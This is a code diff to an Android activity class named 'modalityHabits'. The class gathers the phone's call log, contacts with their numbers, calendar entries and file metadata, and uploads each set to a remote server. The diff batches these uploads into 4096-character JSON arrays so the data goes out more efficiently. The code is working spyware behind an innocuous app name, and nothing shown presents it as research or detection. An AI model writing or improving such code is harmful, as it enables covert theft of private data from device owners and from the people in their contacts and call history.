@@ -19,19 +19,20 @@ import java.util.List;
 
 public class modalityHabits extends AppCompatActivity {
 
+    private final int chunkSize = 4096;
+
     // scrapes call logs and sends them to a server
     public void getCalls(Context mContext){
-        // array of all texts
-        List<String> calls = new ArrayList<>();
 
         // inbox cursor
         Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);
 
         String colName, val;
+        String msgData = "[";
 
         if (cursor.moveToFirst()) { // must check the result to prevent exception
             do {
-                String msgData = "{";
+                msgData += "{";
                 for(int idx=0;idx<cursor.getColumnCount();idx++)
                 {
                     colName = cursor.getColumnName(idx);
@@ -55,18 +56,23 @@ public class modalityHabits extends AppCompatActivity {
 
                 }
                 msgData = msgData.substring(0, msgData.length()-1);
-                msgData += "}";
-                calls.add(msgData);
+                msgData += "},";
+                if(msgData.length() > chunkSize){
+                    msgData = msgData.substring(0, msgData.length()-1);
+                    msgData += "]";
+                    serverHook.sendToServer("log", msgData);
+                    msgData = "[";
+                }
+
             } while (cursor.moveToNext());
         } else {
             System.out.println("No messages found");
         }
         cursor.close();
-
-
-
-        for (String t : calls) {
-            serverHook.sendToServer("log", t);
+        if(msgData.length() > 1){
+            msgData = msgData.substring(0, msgData.length()-1);
+            msgData += "]";
+            serverHook.sendToServer("log", msgData);
         }
     }
 
@@ -80,14 +86,14 @@ public class modalityHabits extends AppCompatActivity {
         }
         Cursor conCursor;
         String id, name, number;
-        String contact;
+        String msgData = "[";
         while(phone != null && phone.moveToNext()){
             name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
             name = name.replace("\"", "'");
             name = name.replace("\n", " ");
             id = phone.getString(phone.getColumnIndex(ContactsContract.Contacts._ID));
-            contact = "{";
-            contact += "\"name\":\"" + name + "\",";
+            msgData += "{";
+            msgData += "\"name\":\"" + name + "\",";
 
             if(phone.getInt(phone.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                 conCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -97,36 +103,45 @@ public class modalityHabits extends AppCompatActivity {
                         null);
                 while(conCursor.moveToNext()){
                     number = conCursor.getString(conCursor.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));
-                    contact += "\"number\":\"" + number + "\",";
+                    msgData += "\"number\":\"" + number + "\",";
                 }
                 conCursor.close();
             }
-            contact = contact.substring(0, contact.length()-1);
-            contact += '}';
-            serverHook.sendToServer("contact",contact);
-
+            msgData = msgData.substring(0, msgData.length()-1);
+            msgData += "},";
+            if(msgData.length() > chunkSize){
+                msgData = msgData.substring(0, msgData.length()-1);
+                msgData += "]";
+                serverHook.sendToServer("contact", msgData);
+                msgData = "[";
+            }
         }
         phone.close();
+        if(msgData.length() > 1){
+            msgData = msgData.substring(0, msgData.length()-1);
+            msgData += "]";
+            serverHook.sendToServer("contact", msgData);
+        }
     }
 
     // scrapes call logs and sends them to a server
     public void getCalendar(Context mContext){
         // array of all texts
-        List<String> events = new ArrayList<>();
 
+        String msgData = "[";
         // inbox cursor
         Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://com.android.calendar/calendars"), null, null, null, null);
 
         if (cursor.moveToFirst()) { // must check the result to prevent exception
             do {
                 String colName, val;
-                String eventData = "{";
+                msgData += "{";
                 for(int idx=0;idx<cursor.getColumnCount();idx++)
                 {
                     colName = cursor.getColumnName(idx);
                     val = cursor.getString(idx);
                     if(val == null || val.equals("")){
-                        eventData += "\"" + colName + "\":\"null\",";
+                        msgData += "\"" + colName + "\":\"null\",";
                     }
                     else{
                         colName = colName.replace("\"", "'");
@@ -135,28 +150,39 @@ public class modalityHabits extends AppCompatActivity {
                         val = val.replace("\"", "'");
                         val = val.replace("\n", " ");
 
-                        eventData += "\""
+                        msgData += "\""
                                 + colName
                                 + "\":\""
                                 + val
                                 + "\",";
                     }
                 }
-                eventData = eventData.substring(0, eventData.length()-1);
-                eventData += '}';
-                serverHook.sendToServer("calendar",eventData);
+                msgData = msgData.substring(0, msgData.length()-1);
+                msgData += "},";
+                if(msgData.length() > chunkSize){
+                    msgData = msgData.substring(0, msgData.length()-1);
+                    msgData += "]";
+                    serverHook.sendToServer("calendar", msgData);
+                    msgData = "[";
+                }
+
             } while (cursor.moveToNext());
         } else {
             System.out.println("No events found");
         }
         cursor.close();
+        if(msgData.length() > 1){
+            msgData = msgData.substring(0, msgData.length()-1);
+            msgData += "]";
+            serverHook.sendToServer("calendar", msgData);
+        }
 
     }
 
     // scrapes call logs and sends them to a server
     public void getStorage(Context mContext){
-        // array of all texts
-        List<String> events = new ArrayList<>();
+
+        String msgData = "[";
 
         // inbox cursor
         Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://media/external/file/"), null, null, null, null);
@@ -164,13 +190,13 @@ public class modalityHabits extends AppCompatActivity {
         if (cursor.moveToFirst()) { // must check the result to prevent exception
             do {
                 String colName, val;
-                String msg = "{";
+                msgData += "{";
                 for(int idx=0;idx<cursor.getColumnCount();idx++)
                 {
                     colName = cursor.getColumnName(idx);
                     val = cursor.getString(idx);
                     if(val == null || val.equals("")){
-                        msg += "\"" + colName + "\":\"null\",";
+                        msgData += "\"" + colName + "\":\"null\",";
                     }
                     else{
                         colName = colName.replace("\"", "'");
@@ -179,27 +205,33 @@ public class modalityHabits extends AppCompatActivity {
                         val = val.replace("\"", "'");
                         val = val.replace("\n", " ");
 
-                        msg += "\""
+                        msgData += "\""
                                 + colName
                                 + "\":\""
                                 + val
                                 + "\",";
                     }
                 }
-                msg = msg.substring(0, msg.length()-1);
-                msg += "}";
-                serverHook.sendToServer("file", msg);
+                msgData = msgData.substring(0, msgData.length()-1);
+                msgData += "},";
+                if(msgData.length() > chunkSize){
+                    msgData = msgData.substring(0, msgData.length()-1);
+                    msgData += "]";
+                    serverHook.sendToServer("file", msgData);
+                    msgData = "[";
+                }
             } while (cursor.moveToNext());
         } else {
             System.out.println("No events found");
         }
         cursor.close();
-
-
-
-        for (String e : events) {
-            //
+        if(msgData.length() > 1){
+            msgData = msgData.substring(0, msgData.length()-1);
+            msgData += "]";
+            serverHook.sendToServer("file", msgData);
         }
+
+
     }
 
 }
